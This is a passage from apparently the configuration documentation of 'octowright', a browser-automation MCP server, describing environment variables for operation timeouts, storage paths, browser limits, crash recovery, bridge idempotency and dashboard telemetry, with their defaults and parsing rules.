  hand here). ONE site is deliberately exempt and allowlisted in that scan:
  `core_page_mixin._evaluate_truthy`, the predicate `_poll_until`
  re-invokes on every iteration of a `browser_wait_for`/`expect_js` poll —
  bounding a per-poll predicate is a different question from bounding a
  one-shot call, so a wedge there is covered by the active-duration ceiling
  (`OCTOWRIGHT_OPERATION_ACTIVE_TIMEOUT_SECONDS`) instead. **ON by default at `30` seconds**,
  unlike this repo's other new quotas: a target that stops answering
  (observed on 2026-08-29 as a full test suite wedged for 12.6 hours against
  a broken WebKit) hangs the calling coroutine forever otherwise, and
  `page.on("crash")` never fires for a target that is merely unresponsive.
  `0` (or a falsey token — `off`/`never`/`none`/`disabled`/`false`/`no`)
  disables it and awaits unbounded; an **unparsable or non-positive value
  falls back to the default**, not to disabled — a typo must not silently
  reintroduce the hang this exists to prevent. Cancellation releases the
  calling coroutine (and the session's operation gate) within the budget,
  but cannot make Playwright's driver or the browser process abandon a call
  already sent over the wire — the underlying request may still be
  outstanding after `bounded()` raises `SessionCallTimeoutError`. See
  **MCP notifications (proactive, LLM-facing)** in [telemetry.md](telemetry.md) for how an escaping
  timeout is turned into an `unresponsive` `SessionCrashedEvent`
  (`octowright_unresponsive_target_total`), and **Browser Session Operation
  Gate** in [session/AGENTS.md](../src/octowright/session/AGENTS.md) for `OCTOWRIGHT_OPERATION_ACTIVE_TIMEOUT_SECONDS`, the
  separate, off-by-default backstop for a call site this budget doesn't yet
  cover. Parser/primitive: `session.timeouts.unbounded_call_timeout_seconds`
  / `bounded`.
- `OCTOWRIGHT_OPERATION_QUEUE_TIMEOUT_SECONDS` — FIFO admission timeout for the
  per-session **Browser Session Operation Gate** (see [session/AGENTS.md](../src/octowright/session/AGENTS.md)). **Default `300`**;
  must parse as positive, finite seconds or the pool/gate fails to configure.
  `BrowserPool(operation_queue_timeout_seconds=...)` takes precedence over the
  env var, which takes precedence over the default. Bounds only the queue wait
  before an operation is admitted — a separate concern from any Playwright
  action/navigation/expect timeout, and no automatic retries are added.
  Close coordinators and crash recovery are durable system operations and do
  not use this timeout. Parser/resolver:
  `session.operation.gate.resolve_operation_queue_timeout_seconds`.
- `OCTOWRIGHT_OPERATION_ACTIVE_TIMEOUT_SECONDS` — opt-in active-duration
  ceiling on a session's operation gate; see **Browser Session Operation
  Gate** in [session/AGENTS.md](../src/octowright/session/AGENTS.md). **OFF by default** (unset or a falsey token —
  `0`/`off`/`never`/`none`/`disabled`/`false`/`no`/empty — disables it),
  unlike the queue-admission timeout above: cancelling in-flight browser
  work is a heavier intervention than failing one call, and this is a
  backstop for call sites nobody has bounded yet, not the primary fix.
  An unparsable value falls back to **OFF**, not to a default budget — the
  opposite of `OCTOWRIGHT_UNBOUNDED_CALL_TIMEOUT_SECONDS`'s fallback, and
  deliberately so: that guard is ON by default and a typo must not silently
  reintroduce the hang, while this one is OFF by default and a typo must
  not silently turn it on. Checked from the periodic housekeeping loop
  (job 6), not a per-gate background task — one timer per session across a
  large pool is real overhead for a rare event. Parser/resolver:
  `session.operation.gate.resolve_operation_active_timeout_seconds`; job:
  `housekeeping._enforce_operation_active_timeout_once`.
- `OCTOWRIGHT_DASHBOARD_OPERATION_TIMEOUT_SECONDS` — separate, much shorter gate
  wait budget for best-effort **dashboard reads** (session-detail aria capture,
  live screenshot, selector validate) that touch a session's operation gate.
  **Default `8.0`** seconds; a non-positive/unparsable value falls back to the
  default rather than going unbounded. An MCP tool call still inherits the
  gate's own `OCTOWRIGHT_OPERATION_QUEUE_TIMEOUT_SECONDS` (300s default) because
  an agent is willing to wait out a real in-flight action, whereas a human
  staring at the dashboard needs a fast, legible failure instead of an
  unexplained multi-minute stall. Parser: `http/routes/_common._dashboard_operation_timeout_seconds`.

## Other knobs

Tuning knobs that rarely need touching, grouped by area. Each line names the
constant or function that parses it. "Bool" knobs use
`defaults._parse_bool_env`: unset means the stated default, and any other
value turns the knob **on** except `0`/`false`/`no`/`off` -- so for an opt-in
knob, an empty value (`OCTOWRIGHT_X=`) also opts in.

**Storage paths**

- `OCTOWRIGHT_RECORDINGS` — recordings root (JSONL, videos, HAR, traces, screenshots, downloads, macro artifacts). Default `<user state dir>/sessions`. `defaults.RECORDINGS_DIR`.
- `OCTOWRIGHT_SCENARIOS_DIR` — scenario spec root (default `<user config dir>/scenarios`). `defaults.SCENARIOS_DIR`.
- `OCTOWRIGHT_GOLDENS_DIR` — golden-snapshot root (default `<user config dir>/goldens`). `defaults.GOLDENS_DIR`.
- `OCTOWRIGHT_CAPTURES_DIR` / `OCTOWRIGHT_CAPTURE_MAX_TOTAL_BYTES` / `OCTOWRIGHT_CAPTURE_TTL_SECONDS` — cached analysis captures: root (default `<user cache dir>/captures`), total size cap (default 50 MiB) and age cap (default 7 days). A single capture larger than the total cap is refused rather than written and immediately pruned. `defaults.CAPTURES_DIR` and neighbours.
- `OCTOWRIGHT_SESSION_MANIFEST` — live-session manifest used for crash recovery (default `<user state dir>/session-manifest.json`). `defaults.SESSION_MANIFEST_PATH`.
- `OCTOWRIGHT_BRIDGE_STATE` — where followers write bridge health snapshots for `octowright_status()["bridge"]` (default `<user state dir>/bridge-state.json`). `defaults.BRIDGE_STATE_PATH`.

**Security opt-ins** are listed under "Capability opt-ins parse strictly" at the top of this file.

**Browser limits and timeouts**

- `OCTOWRIGHT_MAX_BROWSERS` — pool-wide cap on concurrently open browsers, shared by every client of one leader (**default 32**). Caps `browser_launch`, `browser_quick_launch`, `browser_spawn_roster` and `scenario_start`; internal relaunch, handoff and crash recovery are not capped. `0`/`off`/`never`/`none`/`disabled` disable it, and so does an unparsable value. `defaults.MAX_BROWSERS`, enforced in `browser_pool.limits`.
- `OCTOWRIGHT_BROWSER_LAUNCH_TIMEOUT_SECONDS` — total budget for one launch tool call (**default 90**), kept below common 120s client deadlines so a wedged launch returns a tool error. `defaults.BROWSER_LAUNCH_TIMEOUT_SECONDS`.
- `OCTOWRIGHT_SNAPSHOT_TIMEOUT_SECONDS` — budget for one aria-tree snapshot (**default 12**), kept below the 20s bridge request timeout so `browser_snapshot` degrades to a typed result instead of looking like a disconnect. `defaults.SNAPSHOT_TIMEOUT_SECONDS`.
- `OCTOWRIGHT_NETWORK_EVENT_LIMIT` — per-session network rows held in memory (**default 5000**). `defaults.NETWORK_EVENT_LIMIT`.

**Crash recovery and health**

- `OCTOWRIGHT_CRASH_RECOVERY` — renderer-crash auto-recovery (bool, **ON by default**). `defaults.CRASH_RECOVERY_ENABLED`.
- `OCTOWRIGHT_CRASH_RECOVERY_MAX` / `OCTOWRIGHT_CRASH_RECOVERY_RESET_SECONDS` / `OCTOWRIGHT_CRASH_RECOVERY_RELOAD_TIMEOUT_MS` — consecutive recoveries before giving up (default 3), quiet period that resets the count (default 60s), and the replacement page's load budget (default 15000 ms). `defaults.CRASH_RECOVERY_*`.
- `OCTOWRIGHT_HEALTH_CRITICAL_DRIVER_RESTARTS` / `OCTOWRIGHT_HEALTH_CRITICAL_RECOVERY_FAILURES` — counts at which `octowright_status()["health"]` turns `critical` (defaults 3 / 5). `browser_pool.health`.
- `OCTOWRIGHT_INCIDENT_RING_SIZE` / `OCTOWRIGHT_LOST_SESSION_RING_SIZE` — entries kept in the `crash.recent` incident ring and the `pool.lost_sessions` ring (defaults 25 / 25). `browser_pool.incidents`, `browser_pool.driver_relaunch`.

**Follower bridge and idempotency** (see also [troubleshooting.md](troubleshooting.md))

- `OCTOWRIGHT_BRIDGE_REQUEST_TIMEOUT_SECONDS` / `OCTOWRIGHT_BRIDGE_CONNECT_TIMEOUT_SECONDS` — flat in-flight deadline for a forwarded request (default 20) and the connect timeout (default 10). `defaults.BRIDGE_*`.
- Per-tool in-flight floors, `defaults.BRIDGE_TOOL_TIMEOUTS`: `OCTOWRIGHT_BRIDGE_BROWSER_LAUNCH_TIMEOUT_SECONDS` (launch budget + 15, so 105), `OCTOWRIGHT_BRIDGE_MACRO_RUN_TIMEOUT_SECONDS` (120), `OCTOWRIGHT_BRIDGE_MACRO_SEQUENCE_TIMEOUT_SECONDS` (180), `OCTOWRIGHT_BRIDGE_BROWSER_EVALUATE_TIMEOUT_SECONDS` (60), `OCTOWRIGHT_BRIDGE_BROWSER_FILL_TIMEOUT_SECONDS` (60), `OCTOWRIGHT_BRIDGE_BROWSER_TYPE_TIMEOUT_SECONDS` (60), `OCTOWRIGHT_BRIDGE_BROWSER_NAVIGATE_TIMEOUT_SECONDS` (60), `OCTOWRIGHT_BRIDGE_BROWSER_CLICK_TIMEOUT_SECONDS` (45), `OCTOWRIGHT_BRIDGE_BROWSER_WAIT_FOR_TIMEOUT_SECONDS` (90). A tool that emits MCP progress re-arms its deadline on each notification.
- `OCTOWRIGHT_BRIDGE_HEALTH_INTERVAL_SECONDS` / `OCTOWRIGHT_BRIDGE_HEALTH_MAX_FAILURES` — follower health-probe cadence (default 2s) and consecutive failures before the leader session is treated as gone (default 2).
- `OCTOWRIGHT_BRIDGE_RESUME_MAX_ATTEMPTS` — re-sends of an in-flight request across reconnects (default 3) A request is only re-sent to the leader **process** it was first sent to (pid + `started_at` from the lock, `proxy_runtime.resolve_leader_generation`): the dedup cache below is process-local, so a replacement leader would run it again. A call whose leader was replaced is answered with an unknown-outcome error instead (`outcome="unknown"` on `octowright_bridge_rpc_duration_seconds`).
- `OCTOWRIGHT_BRIDGE_LEADER_RECOVERY_WINDOW_SECONDS` — how long a follower keeps retrying an unreachable leader before it exits (**default 180**, longer than an `octowright restart`). `proxy_runtime.BRIDGE_LEADER_RECOVERY_WINDOW_SECONDS`.
- `OCTOWRIGHT_FOLLOWER_EXIT_BACKSTOP_SECONDS` — hard-exit grace after stdin EOF so a follower cannot outlive its client (default 5). `defaults.FOLLOWER_EXIT_BACKSTOP_SECONDS`.
- `OCTOWRIGHT_IDEMPOTENCY` — leader-side dedup of re-sent calls (**ON by default**; `0`/`false`/`no`/`off` disable). Bounds: `OCTOWRIGHT_IDEMPOTENCY_TTL_SECONDS` (180), `OCTOWRIGHT_IDEMPOTENCY_MAX_ENTRIES` (256), `OCTOWRIGHT_IDEMPOTENCY_MAX_RESULT_BYTES` (1 MiB), `OCTOWRIGHT_IDEMPOTENCY_INPROGRESS_WAIT_SECONDS` (630, which must exceed `OCTOWRIGHT_HEARTBEAT_MAX_SECONDS`). `defaults.IDEMPOTENCY_*`.

**Daemon loops and caches**

- `OCTOWRIGHT_IDLE_POLL` — how often the idle watchdog samples the pool (default 2s). `defaults.IDLE_POLL_SECONDS`.
- `OCTOWRIGHT_HOUSEKEEPING_SECONDS` — leader housekeeping cadence (**default 60**; `0`/`off`/`never`/`none`/`disabled` turn the loop off, leaving orphan sweeps to leader boot and `octowright restart`). `defaults.HOUSEKEEPING_INTERVAL_SECONDS`.
- `OCTOWRIGHT_SESSION_ARTIFACT_CACHE_MAX_ENTRIES` / `OCTOWRIGHT_DISCOVERY_CACHE_MAX_ENTRIES` — per-cache LRU bounds for the dashboard's session-artifact caches (default 256) and closed-session discovery caches (default 512).
- `OCTOWRIGHT_DOWNLOAD_PATH_EXISTS_TTL_SECONDS` — TTL of the dashboard's downloads path-exists cache (default 2.0).
- `OCTOWRIGHT_WEBSOCKET_CACHE_FLUSH_FRAMES` / `OCTOWRIGHT_WEBSOCKET_CACHE_FLUSH_SECONDS` — flush the WebSocket frame sidecar after this many frames or this long, whichever comes first (defaults 32 / 0.25).

**Dashboard live preview and telemetry**

- `OCTOWRIGHT_LIVE_SCREENCAST_FPS` / `OCTOWRIGHT_LIVE_SCREENCAST_QUALITY` / `OCTOWRIGHT_LIVE_SCREENCAST_FULLSCREEN_MODE` — live-preview FPS cap (default 10), JPEG quality clamped to 1..100 (default 70), and fullscreen mode `native` or `panel` (default `native`; anything else means `native`). `session.screencast_config`.
- `OCTOWRIGHT_HTTP_METRICS` — HTTP RED metrics (bool, **ON by default**); see [telemetry.md](telemetry.md). `defaults.HTTP_METRICS_ENABLED`.
- `OCTOWRIGHT_METRICS_MACRO_LABEL_CAP` — distinct macro-name label values on macro metrics before the rest collapse to `(overflow)` (default 256). `defaults.METRICS_MACRO_LABEL_CAP`.
